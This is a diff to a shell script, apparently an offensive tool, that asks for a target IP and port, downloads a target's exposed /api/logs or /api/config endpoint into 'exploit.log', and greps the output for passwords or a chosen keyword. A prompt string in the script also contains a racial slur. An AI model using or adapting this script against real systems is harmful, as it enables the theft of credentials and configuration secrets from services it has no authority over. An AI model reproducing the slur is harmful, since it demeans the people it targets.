@@ -9,7 +9,10 @@ echo "Enter ip"
 read dom
 echo "Enter port niggaaaaaaaaaa"
 read port
-curl http://{$dom}:{$port}/api/logs > exploit.log; cat exploit.log | grep password
+echo "grep keyword"
+read grepkey
+curl http://{$dom}:{$port}/api/config? > exploit.log; cat exploit.log | grep $grepkey
+
 ;;
 
 	2)
@@ -19,7 +22,7 @@ echo "Enter port niggaaaaaaaaaa"
 read port
 echo "grep keyword"
 read grepkey
-curl https://{$dom}:{$port}/api/logs > exploit.log; cat exploit.log | grep $grepkey
+curl https://{$dom}:{$port}/api/config? > exploit.log; cat exploit.log | grep $grepkey
 
 
 ;;
